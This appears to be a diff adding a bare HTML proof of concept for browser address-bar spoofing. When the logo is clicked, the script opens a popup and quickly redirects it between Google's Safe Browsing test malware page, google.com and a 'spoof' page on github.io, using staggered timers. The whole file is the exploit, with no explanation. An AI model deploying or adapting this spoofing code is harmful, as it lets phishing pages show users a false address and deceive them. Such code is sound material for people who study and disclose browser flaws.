@@ -1,0 +1,19 @@
+<script>
+function a(){
+	let w = window.open('http://testsafebrowsing.appspot.com/s/malware.html');
+  w.document.write('TEST');
+  setTimeout(()=>{
+      w.location="https://google.com"
+      setTimeout(()=>{
+       w.location="https://ghostxsec.github.io/spoof/"
+      },1600)
+      setTimeout(()=>{
+      w.location.replace("http://testsafebrowsing.appspot.com/s/malware.html")
+      },1700)
+      setTimeout(()=>{
+      w.location="http://testsafebrowsing.appspot.com/s/malware.html"
+      },1800)
+  },1500)
+}
+</script> 
+<center><img src="logo.png" onclick="a()"></center>
